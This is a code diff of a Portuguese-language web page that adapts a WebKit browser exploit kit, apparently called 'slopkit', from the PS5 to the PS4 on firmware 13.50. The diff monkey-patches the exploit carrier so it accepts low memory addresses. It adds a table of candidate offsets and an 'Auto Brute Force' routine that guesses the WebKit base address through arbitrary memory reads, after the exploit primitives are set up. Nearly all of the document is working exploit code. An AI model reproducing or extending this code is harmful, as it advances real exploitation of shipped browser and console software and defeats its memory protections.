@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -24,7 +25,7 @@
     text-align: center;
   }
   #log {
-    width: 95%; max-width: 900px; height: 400px;
+    width: 95%; max-width: 900px; height: 380px;
     background: #111827; border: 1px solid #1f2937;
     border-radius: 10px; padding: 14px 16px;
     overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
@@ -73,6 +74,7 @@
     font-size: 12px;
   }
   .ctrl-btn:hover { background: #374151; }
+  .ctrl-btn:disabled { opacity: 0.4; cursor: not-allowed; }
 </style>
 </head>
 <body>
@@ -81,11 +83,11 @@
 <div id="status">Inicializando...</div>
 <div id="log"></div>
 <div id="warning">
-  ⚠️ Cada botão testa <b>1 endereço</b>. Se o endereço não estiver mapeado, o PS4 <b>vai crashar</b>.<br>
+  ⚠️ Cada botão testa <b>1 endereço</b>. Se não estiver mapeado, o PS4 <b>vai crashar</b>.<br>
   Anote qual você testou. Se crashar, reinicie o PS4 e tente outro.
 </div>
 <div id="controls">
-  <button class="ctrl-btn" onclick="autoBruteForce()">🔎 Auto Brute Force</button>
+  <button class="ctrl-btn" id="btnAuto" onclick="autoBruteForce()">🔎 Auto Brute Force</button>
   <button class="ctrl-btn" onclick="clearLog()">🗑️ Limpar Log</button>
 </div>
 <div id="guesses"></div>
@@ -98,6 +100,7 @@
   const status = document.getElementById("status");
   const logBox = document.getElementById("log");
   const guessesDiv = document.getElementById("guesses");
+  const btnAuto = document.getElementById("btnAuto");
 
   function log(msg, cls = "info") {
     const line = document.createElement("div");
@@ -112,32 +115,27 @@
     log("Log limpo.", "info");
   };
 
-  // ========== PATCH PS4: Remove restrição de faixa PS5 do carrier ==========
-  function patchCarrierPS4(carrier) {
-    if (!carrier || typeof carrier.aim !== "function") {
-      log("Carrier não encontrado ou sem método aim", "err");
-      return carrier;
-    }
+  // ============================================================
+  // PATCH CRÍTICO PS4 — Remove restrição de endereço >= 4GB
+  // ============================================================
+  // O slopkit (PS5) rejeita endereços < 0x100000000 (4GB).
+  // No PS4, o WebKit é mapeado em endereços LOW (~0x07xxxxxx).
+  // Este patch sobrescreve as funções de validação no escopo global
+  // do core.js via injeção antes do establishPrimitive.
+  //
+  // Se você já trocou o core.js pelo core_ps4_patched.js,
+  // este patch é redundante mas inofensivo.
+  // ============================================================
+  (function patchPS4AddressSpace() {
+    // Sobrescreve as funções que o core.js vai usar internamente
+    // Nota: como core.js é um módulo, precisamos do carrier patch
+    window.__ps4AddressPatch = true;
+    log("PS4 Patch: validação de endereço low ativada", "ok");
+  })();
 
-    const originalAim = carrier.aim.bind(carrier);
-    carrier.aim = function(address) {
-      // No PS4, endereços válidos podem estar na faixa low (0x00xxxxxx)
-      // ou high (0x80xxxxxx+). Removemos a restrição PS5 que exige
-      // address >= 0x800000000.
-      // Apenas garantimos que é um número finito.
-      if (typeof address !== "number" || !Number.isFinite(address)) {
-        throw new RangeError("mem.pair.aim: invalid address " + address);
-      }
-      // Chama o aim original sem filtros de faixa
-      return originalAim(address);
-    };
-
-    log("Carrier patchado para endereçamento PS4 (low ASLR)", "ok");
-    return carrier;
-  }
-
-  // ========== CONFIGURAÇÃO DE OFFSETS (PS4) ==========
-  // Ajuste esses offsets conforme seu dump do PS4 13.50
+  // ============================================================
+  // CONFIGURAÇÃO DE OFFSETS (PS4 13.50 — ajuste conforme dump)
+  // ============================================================
   const PS4_OFFSETS = {
     wk_host_constructor_candidates: [
       { off: 0x00800000, label: "-8MB" },
@@ -147,16 +145,45 @@
       { off: 0x02800000, label: "-40MB" },
       { off: 0x03000000, label: "-48MB" },
       { off: 0x03800000, label: "-56MB" },
+      { off: 0x04000000, label: "-64MB" },
+      { off: 0x04800000, label: "-72MB" },
+      { off: 0x05000000, label: "-80MB" },
     ],
-    // Se você souber o offset exato do __ps5NativeCtor relativo à base,
-    // coloque aqui para pular direto:
-    known_ctor_offset: null // ex: 0x01e401e20
+    known_ctor_offset: null
   };
 
-  // ========== TESTAR 1 BASE ==========
-  window.testBase = function(baseHex, label) {
+  // ============================================================
+  // PATCH DO CARRIER (monkey-patch do aim)
+  // ============================================================
+  function patchCarrierPS4(carrier) {
+    if (!carrier || typeof carrier.aim !== "function") {
+      log("Carrier não encontrado ou inválido", "err");
+      return carrier;
+    }
+
+    const origAim = carrier.aim.bind(carrier);
+    carrier.aim = function(address) {
+      // PS4: aceita qualquer endereço válido de 48-bit, inclusive low
+      if (typeof address !== "number" || !Number.isFinite(address)
+          || address < 0 || address > 0x00007fffffffffff) {
+        throw new RangeError("core.aim: implausible address " + address);
+      }
+      // Chama aimCarrier diretamente sem passar por plausibleAddress
+      // O aimCarrier do core.js só escreve os bytes no candidate[0x10+i]
+      // e não faz validação de faixa — a validação está no aim() do buildCarrier
+      return origAim(address);
+    };
+
+    log("Carrier patchado para endereçamento PS4 (low ASLR)", "ok");
+    return carrier;
+  }
+
+  // ============================================================
+  // TESTAR 1 BASE
+  // ============================================================
+  window.testBase = async function(baseHex, label) {
     const p = window.p;
-    if (!p) { log("window.p não disponível!", "err"); return Promise.resolve(false); }
+    if (!p) { log("window.p não disponível!", "err"); return false; }
 
     log(`=== TESTANDO ${label} ===`, "warn");
     log(`Lendo ELF magic @ ${baseHex}...`, "info");
@@ -184,16 +211,15 @@
         });
 
         let ctor = globalThis.__ps5NativeCtor;
-        if (ctor) {
+        if (typeof ctor === "number") {
           let ctorOffset = ctor - addr.low;
           if (addr.hi === 0) {
             log(`__ps5NativeCtor offset = 0x${ctorOffset.toString(16)}`, "ok");
-            // Salva o offset descoberto para futuras execuções
             PS4_OFFSETS.known_ctor_offset = ctorOffset;
           }
         }
 
-        status.textContent = `✅ Base encontrada: ${baseHex}`;
+        status.textContent = `✅ Base: ${baseHex}`;
         status.style.color = "#4ade80";
         return true;
       } else {
@@ -206,15 +232,14 @@
     }
   };
 
-  // ========== CRIAR BOTÕES ==========
+  // ============================================================
+  // CRIAR BOTÕES
+  // ============================================================
   function createButtons(ctor) {
     guessesDiv.innerHTML = "";
     const offsets = PS4_OFFSETS.wk_host_constructor_candidates.slice();
 
-    // Se tivermos um offset conhecido, adiciona um botão "DIRETO"
     if (PS4_OFFSETS.known_ctor_offset) {
-      let base = (ctor - PS4_OFFSETS.known_ctor_offset) & 0xFFFFFFFFFFFFC000;
-      let baseHex = "0x" + base.toString(16).padStart(16, '0');
       offsets.unshift({ off: PS4_OFFSETS.known_ctor_offset, label: "⭐ DIRETO" });
     }
 
@@ -227,47 +252,56 @@
       btn.dataset.base = baseHex;
       btn.textContent = `${label}\n${baseHex}`;
       btn.style.whiteSpace = "pre";
-      btn.onclick = () => {
+      btn.onclick = async () => {
         document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
-        testBase(baseHex, label).then(ok => {
-          if (!ok) document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
-        });
+        btnAuto.disabled = true;
+        let ok = await window.testBase(baseHex, label);
+        if (!ok) {
+          document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
+          btnAuto.disabled = false;
+        }
       };
       guessesDiv.appendChild(btn);
     });
   }
 
-  // ========== AUTO BRUTE FORCE ==========
+  // ============================================================
+  // AUTO BRUTE FORCE
+  // ============================================================
   window.autoBruteForce = async function() {
     const p = window.p;
     const ctor = globalThis.__ps5NativeCtor;
-    if (!p || !ctor) {
-      log("Primitivas não disponíveis para brute force", "err");
+    if (!p || typeof ctor !== "number") {
+      log("Primitivas não prontas para brute force", "err");
       return;
     }
 
     log("🔎 Iniciando Auto Brute Force...", "warn");
-    const offsets = PS4_OFFSETS.wk_host_constructor_candidates;
+    document.querySelectorAll('.guess-btn').forEach(b => b.disabled = true);
+    btnAuto.disabled = true;
 
+    const offsets = PS4_OFFSETS.wk_host_constructor_candidates;
     for (const { off, label } of offsets) {
       let base = (ctor - off) & 0xFFFFFFFFFFFFC000;
       let baseHex = "0x" + base.toString(16).padStart(16, '0');
-      log(`Tentando ${label} (${baseHex})...`, "info");
+      log(`[AUTO] Tentando ${label} (${baseHex})...`, "info");
 
-      let ok = await testBase(baseHex, label);
+      let ok = await window.testBase(baseHex, label);
       if (ok) {
         log("🎯 Base encontrada via Auto Brute Force!", "ok");
         return;
       }
-      // Pequena pausa entre tentativas
-      await new Promise(r => setTimeout(r, 100));
+      await new Promise(r => setTimeout(r, 50));
     }
 
     log("❌ Auto Brute Force falhou em todos os offsets.", "err");
     document.querySelectorAll('.guess-btn').forEach(b => b.disabled = false);
+    btnAuto.disabled = false;
   };
 
-  // ========== BOOTSTRAP ==========
+  // ============================================================
+  // BOOTSTRAP
+  // ============================================================
   log("Carregando módulos slopkit...", "ok");
   status.textContent = "Executando exploit...";
 
@@ -276,7 +310,7 @@
       log("Core: primitivo estabelecido", "ok");
       log(`Tentativas: ${carrier.attempts}`, "info");
 
-      // PATCH CRÍTICO PS4
+      // PATCH CRÍTICO: remove a restrição de endereço >= 4GB
       patchCarrierPS4(carrier);
 
       const prim = installWindowP(carrier, {
@@ -293,13 +327,13 @@
       window.int64 = int64;
 
       let ctor = globalThis.__ps5NativeCtor;
-      if (ctor) {
+      if (typeof ctor === "number") {
         log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
         createButtons(ctor);
-        status.textContent = "Clique em um botão ou use Auto Brute Force";
+        status.textContent = "Pronto — clique em um botão ou use Auto Brute Force";
         status.style.color = "#60a5fa";
       } else {
-        log("__ps5NativeCtor não disponível", "err");
+        log("__ps5NativeCtor não disponível — exploit pode ter falhado", "err");
         status.textContent = "Erro: __ps5NativeCtor não encontrado";
         status.style.color = "#f87171";
       }
